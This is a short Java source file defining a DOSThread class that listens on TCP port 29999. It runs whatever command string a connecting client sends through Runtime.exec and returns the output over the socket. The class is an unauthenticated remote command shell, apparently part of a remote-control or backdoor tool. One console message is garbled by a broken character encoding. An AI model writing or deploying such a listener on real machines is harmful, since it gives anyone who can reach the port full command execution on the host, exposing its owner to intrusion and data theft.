package server;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;

public class DOSThread extends Thread {
	ServerSocket ss_file=null;
	Socket s_file=null;
	//FileOutputStream fos=null;
	DataInputStream dis =null;
	String str;
	
	public DOSThread()
	{
	
		try {
			 ss_file=new ServerSocket(29999);
			s_file=ss_file.accept();
			System.out.println("dos�������ӳɹ�");
			this.start();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	public void run(){
		try{
			 DataInputStream dis=new DataInputStream(s_file.getInputStream());
                  String str=dis.readUTF();
                  System.out.println(str);
			Process process=Runtime.getRuntime().exec(str); 
			 InputStreamReader isr=new InputStreamReader(process.getInputStream());
			LineNumberReader input=new LineNumberReader(isr);
			 String line;
			 OutputStream os=s_file.getOutputStream();
				PrintStream ps=new PrintStream(os);
				while((line=input.readLine())!=null){
					 ps.println(line);
					 ps.flush();
					 System.out.println(line);
				}
			
           
		}catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}finally{
			try{
				
				if(dis!=null){
					dis.close();
				}
				s_file.close();
			}catch(Exception e){}
		}
	}
}
